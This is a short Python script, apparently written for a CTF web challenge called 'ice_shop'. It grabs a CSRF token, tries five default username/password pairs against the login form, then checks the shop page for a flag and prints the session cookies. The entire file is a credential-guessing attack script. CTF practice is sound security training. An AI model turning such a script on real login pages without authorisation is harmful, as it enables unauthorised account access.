#!/usr/bin/env python3
import requests
import re

BASE_URL = "http://ctf.mf.grsu.by/web_tasks/ice_shop"

session = requests.Session()

def get_csrf_token(html):
    """Extract CSRF token from HTML"""
    match = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\'](.*?)["\']', html)
    if match:
        return match.group(1)
    return None

def try_login(username, password):
    """Try to login with given credentials"""
    # Get login page first to get CSRF token
    login_url = f"{BASE_URL}/auth_system/login/"
    resp = session.get(login_url)
    csrf_token = get_csrf_token(resp.text)

    if not csrf_token:
        print("No CSRF token found")
        return False

    # Try to login
    data = {
        'csrfmiddlewaretoken': csrf_token,
        'username': username,
        'password': password
    }

    resp = session.post(login_url, data=data, headers={
        'Referer': login_url
    })

    print(f"Login attempt with {username}:{password}")
    print(f"Status: {resp.status_code}")

    if "Ошибка в форме" not in resp.text:
        print("Login might be successful!")
        return True
    else:
        print("Login failed")
        return False

def check_shop():
    """Check if we can access the shop"""
    shop_url = f"{BASE_URL}/shop/"
    resp = session.get(shop_url, allow_redirects=False)

    print(f"\nShop access status: {resp.status_code}")
    if resp.status_code == 200:
        print("Shop accessible!")
        print(resp.text[:500])
        return resp.text
    elif resp.status_code == 302:
        print(f"Redirected to: {resp.headers.get('Location')}")
    return None

# Try common credentials
print("=== Trying common credentials ===")
common_creds = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('test', 'test'),
    ('guest', 'guest'),
]

for username, password in common_creds:
    if try_login(username, password):
        shop_content = check_shop()
        if shop_content:
            # Search for flag
            if 'flag' in shop_content.lower() or 'ctf' in shop_content.lower():
                print("\n!!! Potential flag found !!!")
                print(shop_content)
        break
else:
    print("\nNo credentials worked, checking shop anyway...")
    check_shop()

# Check session cookies
print(f"\nSession cookies: {session.cookies.get_dict()}")
